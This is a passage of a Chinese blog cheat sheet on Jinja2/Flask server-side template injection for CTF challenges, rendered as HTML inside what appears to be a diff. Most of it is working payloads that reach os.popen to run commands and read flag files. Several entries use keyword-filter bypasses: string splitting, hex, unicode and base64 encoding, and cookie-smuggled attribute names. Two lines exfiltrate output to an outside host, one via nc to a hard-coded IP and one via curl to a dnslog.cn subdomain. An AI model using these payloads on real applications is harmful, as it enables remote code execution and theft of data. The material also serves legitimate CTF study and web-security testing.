class="hljs-number">111</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)].popen(chr(<span class="hljs-number">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">116</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">32</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">102</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">108</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">103</span>)).read())<span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">用vps监听或者DNSlog带出flag</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__mro__</span>[-1].__subclasses__()[117].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;catflag|nc8.136.15.23280&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__mro__</span>[-1].__subclasses__(<span class="hljs-name">[117].__init__.__globals__</span>[<span class="hljs-string">&#x27;popen&#x27;</span>(<span class="hljs-name">&#x27;curl http://`catflag`.u5d01l.dnslog.cn&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h5><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">1</span>.进行拼接<br><span class="hljs-string">&quot;cla&quot;</span>+<span class="hljs-string">&quot;ss&quot;</span><br><span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;__cla&quot;</span><span class="hljs-string">&quot;ss__&quot;</span>]<br><span class="hljs-string">&quot;&quot;</span>.__getattribute__(<span class="hljs-string">&quot;__cla&quot;</span><span class="hljs-string">&quot;ss__&quot;</span>)<br><br><span class="hljs-number">2</span>进行反转 <br><span class="hljs-string">&quot;&quot;</span>.[<span class="hljs-string">&quot;__ssalc__&quot;</span>][::-<span class="hljs-number">1</span>]<br><span class="hljs-string">&quot;&quot;</span>.__getattribute__(<span class="hljs-string">&quot;__ssalc__&quot;</span>[::-<span class="hljs-number">1</span>])<br>以上与句等同于<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;__class__&quot;</span>]<br><br><span class="hljs-number">3</span>,使用asciii<br>直接进行<span class="hljs-keyword">ascii</span>转换<br>&#123;<span class="hljs-number">0</span>:<span class="hljs-keyword">c</span>&#125;<span class="hljs-comment">&quot;.format(97)=&#x27;a&#x27;</span><br><span class="hljs-string">&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;</span>.format(<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">99</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>)=<span class="hljs-string">&#x27;__class__&#x27;</span><br><br><span class="hljs-number">4</span>，利用过滤器<br>使用<span class="hljs-keyword">join</span>()函数绕过，比如过滤了flag关键字<br>[].__class__.__base__.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&quot;fla&quot;</span>.<span class="hljs-keyword">join</span>(<span class="hljs-string">&quot;/g&quot;</span>)).<span class="hljs-keyword">read</span>()<br><br><span class="hljs-number">5</span>.获取字符：&#123;&#123;lipsum|<span class="hljs-built_in">string</span>|<span class="hljs-keyword">list</span>|attr(<span class="hljs-string">&#x27;pop&#x27;</span>)(<span class="hljs-number">18</span>)&#125;&#125; 相当于：lipsum|<span class="hljs-built_in">string</span>|<span class="hljs-keyword">list</span>|attr(<span class="hljs-string">&#x27;pop&#x27;</span>)(<span class="hljs-number">18</span>)  输出：_（下划线）<br>|&#123;&#123;lipsum|<span class="hljs-built_in">string</span>|<span class="hljs-keyword">list</span>&#125;&#125;能获取一个列表.<span class="hljs-built_in">string</span>变变量为字符，<span class="hljs-keyword">list</span>变字符为列表。attr(<span class="hljs-string">&#x27;pop&#x27;</span>)为使用<span class="hljs-keyword">pop</span>方法获取第<span class="hljs-number">19</span>个字符<br>[<span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>]<br><br><span class="hljs-number">6</span>.使用编码<br><span class="hljs-number">16</span>进制编码<br>&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__&#125;&#125;等价于&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&quot;__class__&quot;</span>]&#125;&#125;，所以可以将其中关键字编码或者部分编码，如<br>&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&quot;\x5f\x5f\x63las\x73\x5f\x5f&quot;</span>]&#125;&#125;<br><br>使用unicode编码（适用于Flask）<br>&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&quot;\u005f\u005fclas\u0073\u005f\u005f&quot;</span>]&#125;&#125;<br>使用字符串拼接、引号绕过，在Jinjia2中加号可以省略<br>&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&quot;__clas&quot;</span>+<span class="hljs-string">&quot;s__&quot;</span>]&#125;&#125;<br>&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&quot;__clas&quot;</span><span class="hljs-string">&quot;s__&quot;</span>]&#125;&#125;<br>使用base64编码（适用于Python2）<br>&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;X19idWlsdGluc19f&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)][<span class="hljs-string">&#x27;ZXZhbA==&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)](<span class="hljs-string">&#x27;X19pbXBvcnRfXygib3MiKS5wb3Blbigid2hvYW1pIikucmVhZCgp&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>))&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">20</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">09</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0b</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0c</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0d</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">a0</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">00</span></span><br></code></pre></td></tr></table></figure>
+
+<h5 id="数字获取"><a href="#数字获取" class="headerlink" title="数字获取"></a>数字获取</h5><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> five=(lipsum<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list)<span class="hljs-punctuation">|</span>attr(index)(t)&#125; 得到数字<span class="hljs-number">5</span><br><br>也可以通过for循环来构造数字<br>&#123;%for i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;__cla&quot;</span><span class="hljs-string">&quot;ss__&quot;</span>][<span class="hljs-string">&quot;__mr&quot;</span><span class="hljs-string">&quot;o__&quot;</span>][<span class="hljs-number">1</span>][<span class="hljs-string">&quot;__subcla&quot;</span><span class="hljs-string">&quot;sses__&quot;</span>]()<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">if</span> i.__name__ == <span class="hljs-string">&quot;_wrap_close&quot;</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span> i[<span class="hljs-string">&quot;__in&quot;</span><span class="hljs-string">&quot;it__&quot;</span>][<span class="hljs-string">&quot;__glo&quot;</span><span class="hljs-string">&quot;bals__&quot;</span>][<span class="hljs-string">&quot;po&quot;</span><span class="hljs-string">&quot;pen&quot;</span>](<span class="hljs-string">&#x27;cat f*&#x27;</span>)[<span class="hljs-string">&quot;re&quot;</span><span class="hljs-string">&quot;ad&quot;</span>]()<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">endif</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">endfor</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">使用构造器</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> zero = (self<span class="hljs-punctuation">|</span>int) <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;zero&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="使用request"><a href="#使用request" class="headerlink" title="使用request"></a>使用request</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">可以通过request.args.get[&#x27;key&#x27;]来获取url中的get参数。功能十分强大，理论上可以绕过大多数过滤</span><br><span class="language-xml"></span><br><span class="language-xml">code=</span><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">x</span>|attr(<span class="hljs-name">request.cookies.x1</span>)|attr(<span class="hljs-name">request.cookies.x2</span>)|attr(<span class="hljs-name">request.cookies.x3</span>))(<span class="hljs-name">request.cookies.x4</span>).eval(<span class="hljs-name">request.cookies.x5</span>)&#125;&#125;</span><span class="language-xml"> </span><br><span class="language-xml">Cookie：x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__(&#x27;os&#x27;).popen(&#x27;cat f*&#x27;).read()</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="下划线（-）"><a href="#下划线（-）" class="headerlink" title="下划线（_）"></a>下划线（_）</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">使用编码</span><br><span class="language-xml">16进制编码</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">[&quot;\x5f\x5fclass\x5f\x5f&quot;]</span>[&quot;\x5f\x5fmro\x5f\x5f&quot;][-1][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[258][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;os&quot;].popen(<span class="hljs-name">&quot;cat flag&quot;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">Unicode编码</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">&quot;\u005f\u005fglobals\u005f\u005f&quot;</span>)|attr(<span class="hljs-name">&quot;\u005f\u005fgetitem\u005f\u005f&quot;</span>)(<span class="hljs-name">&quot;os&quot;</span>)|attr(<span class="hljs-name">&quot;popen&quot;</span>)(<span class="hljs-name">&quot;cat flag&quot;</span>)|attr(<span class="hljs-name">&quot;read&quot;</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">使用base64</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">&#x27;X19jbGFzc19f&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))|attr(<span class="hljs-name">&#x27;X19iYXNlX18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))|attr(<span class="hljs-name">&#x27;X19zdWJjbGFzc2VzX18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))()|attr(<span class="hljs-name">&#x27;X19nZXRpdGVtX18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))(<span class="hljs-name">258</span>)|attr(<span class="hljs-name">&#x27;X19pbml0X18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))|attr(<span class="hljs-name">&#x27;X19nbG9iYWxzX18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))|attr(<span class="hljs-name">&#x27;X19nZXRpdGVtX18=&#x27;.d7ecode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))(<span class="hljs-name">&#x27;os&#x27;</span>)|attr(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;cat flag&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">使用request对象。Flask可以有以下参数</span><br><span class="language-xml">form</span><br><span class="language-xml">args</span><br><span class="language-xml">values</span><br><span class="language-xml">cookies</span><br><span class="language-xml">stream</span><br><span class="language-xml">headers</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">[request.args.class]</span>[request.args.bases][0][request.args.subclasses]()[80](<span class="hljs-name">&#x27;/flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml">&amp;class=__class__&amp;bases=__bases__&amp;subclasses=__subclasses__</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">[request.args.class]</span>[request.args.bases][0][request.args.subclasses]()[80].__init__.__globals__[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml">&amp;class=__class__&amp;bases=__bases__&amp;subclasses=__subclasses__</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="config环境"><a href="#config环境" class="headerlink" title="config环境"></a>config环境</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">使用url_for</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">使用get_flashed_messages</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="使用构造器"><a href="#使用构造器" class="headerlink" title="使用构造器"></a>使用构造器</h5><blockquote>
+<p>其他用法详见官方文档：</p>
+</blockquote>
+<p>Template Designer Documentation - Jinja Documentation (3.2.x)</p>
+<p>使用过滤器构造Payload，一般思路是利用这些过滤器，逐步拼接出需要的字符、数字或字符串。对于一般原始字符的获取方法有以下几种：</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-template-variable">&#123;% set org = (&#123; &#125;|<span class="hljs-keyword">select</span>()|string()) %&#125;</span><span class="hljs-template-variable">&#123;&#123;org&#125;&#125;</span><br><span class="hljs-comment"># &lt;generator object select_or_reject at 0x0000020B2CA4EA20&gt;</span><br><span class="hljs-template-variable">&#123;% set org = (<span class="hljs-keyword">self</span>|string()) %&#125;</span><span class="hljs-template-variable">&#123;&#123;org&#125;&#125;</span><br><span class="hljs-comment"># &lt;TemplateReference None&gt;</span><br><span class="hljs-template-variable">&#123;% set org = <span class="hljs-keyword">self</span>|string|urlencode %&#125;</span><span class="hljs-template-variable">&#123;&#123;org&#125;&#125;</span><br><span class="hljs-comment"># %3CTemplateReference%20None%3E</span><br><span class="hljs-template-variable">&#123;% set org = (app.__doc__|string) %&#125;</span><span class="hljs-template-variable">&#123;&#123;org&#125;&#125;</span><br><span class="hljs-comment"># Hello The default undefined type.  This undefined type can be printed and</span><br><span class="hljs-comment">#    iterated over, but every other access will raise an :exc:`UndefinedError`:</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#     &gt;&gt;&gt; foo = Undefined(name=&#x27;foo&#x27;)</span><br><span class="hljs-comment">#     &gt;&gt;&gt; str(foo)</span><br><span class="hljs-comment">#     &#x27;&#x27;</span><br><span class="hljs-comment">#     &gt;&gt;&gt; not foo</span><br><span class="hljs-comment">#     True</span><br><span class="hljs-comment">#     &gt;&gt;&gt; foo + 42</span><br><span class="hljs-comment">#     Traceback (most recent call last):</span><br><span class="hljs-comment">#       ...</span><br><span class="hljs-comment">#     jinja2.exceptions.UndefinedError: &#x27;foo&#x27; is undefined</span><br><span class="hljs-template-variable">&#123;% set num = (<span class="hljs-keyword">self</span>|int) %&#125;</span><span class="hljs-template-variable">&#123;&#123;num&#125;&#125;</span><br><span class="hljs-comment"># 0</span><br><span class="hljs-template-variable">&#123;% set num = (<span class="hljs-keyword">self</span>|string|length) %&#125;</span><span class="hljs-template-variable">&#123;&#123;num&#125;&#125;</span><br><span class="hljs-comment"># 24</span><br><span class="hljs-template-variable">&#123;% set point = <span class="hljs-keyword">self</span>|float|string|min %&#125;</span><span class="hljs-template-variable">&#123;&#123;point&#125;&#125;</span><br><span class="hljs-comment"># .</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="题"><a href="#题" class="headerlink" title="题"></a>题</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//buuoj.cn/challenges#[GYCTF<span class="hljs-number">2020</span>]FlaskApp<br><span class="hljs-symbol">https:</span>//buuoj.cn/challenges#[<span class="hljs-variable">%E7</span><span class="hljs-variable">%AC</span><span class="hljs-variable">%AC</span><span class="hljs-variable">%E4</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%89</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%20</span>web<span class="hljs-variable">%E8</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%9</span>B<span class="hljs-variable">%E9</span><span class="hljs-variable">%98</span><span class="hljs-variable">%B6</span>]SSTI<br><span class="hljs-symbol">https:</span>//adworld.xctf.org.cn/task/answer?<span class="hljs-keyword">type</span><span class="hljs-operator">=</span>web&amp;number<span class="hljs-operator">=</span><span class="hljs-number">3</span>&amp;grade<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;id<span class="hljs-operator">=</span><span class="hljs-number">5408</span>&amp;page<span class="hljs-operator">=</span><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/essay/" class="category-chain-item">essay</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/essay/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">代码审计</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/essay/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/python/" class="category-chain-item">python</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ssti</div>
+      <div>http://example.com/2023/06/14/ssti/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>TvT</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年6月14日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/06/14/idea%E6%8A%80%E5%B7%A7/" title="idea技巧">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">idea技巧</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/06/14/RMI/" title="RMI">
+                        <span class="hidden-mobile">RMI</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
